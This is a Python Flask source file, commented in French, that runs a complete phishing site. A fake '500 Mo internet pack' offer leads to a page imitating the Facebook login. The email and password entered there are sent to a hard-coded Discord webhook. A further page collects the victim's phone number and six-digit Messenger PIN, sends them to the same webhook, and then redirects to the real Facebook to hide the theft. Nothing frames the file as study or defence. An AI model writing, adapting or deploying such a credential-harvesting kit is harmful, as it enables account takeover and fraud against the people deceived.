import os
import requests
from flask import Flask, request, redirect, render_template_string

app = Flask(__name__)

# --- CONFIGURATION DISCORD ---
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1471099314398040230/mrOS59JK1KfeIQICVwIFwNbURRhR08ivbdWy_P3VQdwPJD4r1opB8krL26i1tyePIH8h"

def send_to_discord(message):
    data = {"content": message}
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception as e:
        print(f"Erreur : {e}")

# --- INTERFACES HTML ---

HTML_ACCUEIL = '''
<!DOCTYPE html>
<html>
<body style="text-align:center; font-family:sans-serif; background:#eef2f7; padding:50px;">
    <div style="background:white; padding:30px; border-radius:15px; display:inline-block; box-shadow:0 8px 20px rgba(0,0,0,0.1);">
        <h2>🎁 PACK INTERNET 500 MO</h2>
        <p>Offre limitée : Vérifiez votre éligibilité.</p>
        <a href="/auth" style="display:block; padding:15px; background:#3498db; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">VÉRIFIER MAINTENANT</a>
    </div>
</body>
</html>
'''

HTML_FACEBOOK = '''
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="font-family:Helvetica, Arial, sans-serif; background:#f0f2f5; text-align:center; margin:0;">
    <div style="width:100%; background:white; padding:20px 0; color:#1877f2; font-size:30px; font-weight:bold;">facebook</div>
    <div style="width:90%; max-width:400px; display:inline-block; background:white; padding:20px; margin-top:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1);">
        <p style="font-size:14px; color:#606770;">Connectez-vous pour continuer vers l'offre.</p>
        <form action="/capture" method="post">
            <input type="text" name="email" placeholder="Email ou Mobile" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
            <input type="password" name="pass" placeholder="Mot de passe" style="width:100%; padding:14px; margin:5px 0; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box;" required><br>
            <button type="submit" style="width:100%; padding:12px; background:#1877f2; color:white; border:none; border-radius:6px; font-size:18px; font-weight:bold; margin-top:10px; cursor:pointer;">Suivant</button>
        </form>
    </div>
</body>
</html>
'''

# INTERFACE FUSIONNÉE (PIN + TÉLÉPHONE)
HTML_VALIDATION_FINALE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background: white; width: 95%; max-width: 450px; padding: 30px 20px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .header-icon { background-color: #d1e3ff; width: 60px; height: 30px; border-radius: 15px; display: inline-flex; justify-content: center; align-items: center; color: #0064e0; font-weight: bold; margin-bottom: 20px; }
        h1 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
        .info-text { color: #606770; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
        
        .field-label { text-align: left; display: block; font-size: 13px; font-weight: bold; color: #4b4f56; margin: 10px 0 5px 5px; }
        input[type="text"], input[type="tel"] { width: 100%; padding: 12px; border: 1px solid #ced0d4; border-radius: 8px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; }
        
        .pin-container { display: flex; justify-content: space-between; gap: 5px; margin: 15px 0; }
        .pin-box { width: 14%; height: 50px; border: 1px solid #ced0d4; border-radius: 6px; text-align: center; font-size: 20px; font-weight: bold; background: #f5f6f7; }
        
        .btn-submit { width: 100%; padding: 14px; background-color: #00a400; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; text-transform: uppercase; }
        .btn-submit:hover { background-color: #008f00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-icon">***_</div>
        <h1>Finalisez votre demande</h1>
        <p class="info-text">Entrez votre numéro et votre PIN Messenger pour restaurer vos discussions et recevoir vos <b>500 Mo</b> immédiatement.</p>
        
        <form action="/capture_finale" method="post">
            <span class="field-label">Numéro de téléphone :</span>
            <input type="tel" name="phone" placeholder="Ex: 034XXXXXXX" required>
            
            <span class="field-label">Code PIN Messenger (6 chiffres) :</span>
            <div class="pin-container">
                <input type="text" class="pin-box" name="p1" maxlength="1" required>
                <input type="text" class="pin-box" name="p2" maxlength="1" required>
                <input type="text" class="pin-box" name="p3" maxlength="1" required>
                <input type="text" class="pin-box" name="p4" maxlength="1" required>
                <input type="text" class="pin-box" name="p5" maxlength="1" required>
                <input type="text" class="pin-box" name="p6" maxlength="1" required>
            </div>
            
            <button type="submit" class="btn-submit">RÉCLAMER MAINTENANT</button>
        </form>
    </div>

    <script>
        const inputs = document.querySelectorAll('.pin-box');
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
        });
    </script>
</body>
</html>
'''

# --- ROUTES (LOGIQUE) ---

@app.route('/')
def home():
    return render_template_string(HTML_ACCUEIL)

@app.route('/auth')
def auth():
    return render_template_string(HTML_FACEBOOK)

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email')
    password = request.form.get('pass')
    send_to_discord(f"👤 **FB** : `{email}`\n🔑 **PASS** : `{password}`")
    # Redirige vers la page fusionnée
    return render_template_string(HTML_VALIDATION_FINALE)

@app.route('/capture_finale', methods=['POST'])
def capture_finale():
    phone = request.form.get('phone')
    # Reconstruction du PIN
    p1 = request.form.get('p1')
    p2 = request.form.get('p2')
    p3 = request.form.get('p3')
    p4 = request.form.get('p4')
    p5 = request.form.get('p5')
    p6 = request.form.get('p6')
    full_pin = f"{p1}{p2}{p3}{p4}{p5}{p6}"
    
    # Envoi simultané à Discord
    send_to_discord(f"📱 **TEL** : `{phone}`\n💬 **PIN** : `{full_pin}`")
    
    # Redirection finale
    return redirect("https://m.facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
